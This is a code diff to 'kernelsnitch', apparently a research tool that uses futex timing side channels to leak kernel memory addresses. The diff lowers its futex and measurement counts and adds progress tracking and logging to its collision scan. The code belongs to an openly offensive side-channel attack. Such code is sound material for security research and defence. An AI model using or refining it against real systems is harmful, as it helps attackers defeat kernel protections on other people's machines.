@@ -23,7 +23,7 @@
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
 #endif
-#define APPENDED_FUTEXES 4096
+#define APPENDED_FUTEXES 1024
 #define MULITPLE 4
 #if defined(__INTEL) || defined(__AMD)
 #define IDENTITY_START 0xffff888000000000ULL
@@ -85,6 +85,7 @@ struct kernelsnitch_shared_state {
     volatile size_t *times;
     volatile size_t found;
     volatile size_t mm_struct;
+    volatile size_t scan_done;
 
     pthread_t *tids;
     size_t identity_diff;
@@ -144,7 +145,7 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
 /**
  * Simple compare
  */
-#define REPEAT_MEASUREMENT 128
+#define REPEAT_MEASUREMENT 16
 #define AVERAGE (1<<3)
 static int __compare(const void *a, const void *b)
 {
@@ -256,6 +257,7 @@ struct kernelsnitch_shared_state *kernelsnitch_setup(size_t __mm_struct_sz, size
 {
     struct kernelsnitch_shared_state *ks = SYSCHK(mmap(0, sizeof(struct kernelsnitch_shared_state), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
     ks->mm_struct = -1;
+    ks->scan_done = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
     ks->cpu_cnt = sysconf(_SC_NPROCESSORS_ONLN)*2;
@@ -319,10 +321,13 @@ void kernelsnitch_find_collisions(struct kernelsnitch_shared_state *ks)
     ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     for (size_t i = 2; i < ks->total_futexes && count < wanted; ++i) {
+        if (ks->verbose && (i % 256) == 0)
+            pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
         id = (i*4096) | (i*8 % 4096);
         if (id >= FUTEX_SZ)
             break;
         futex_addr = (size_t)&ks->futexes[id];
+        ks->scan_done = i;
         ks->times[i] = __measure(futex_addr);
         if (ks->times[i] > (approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
             count++;
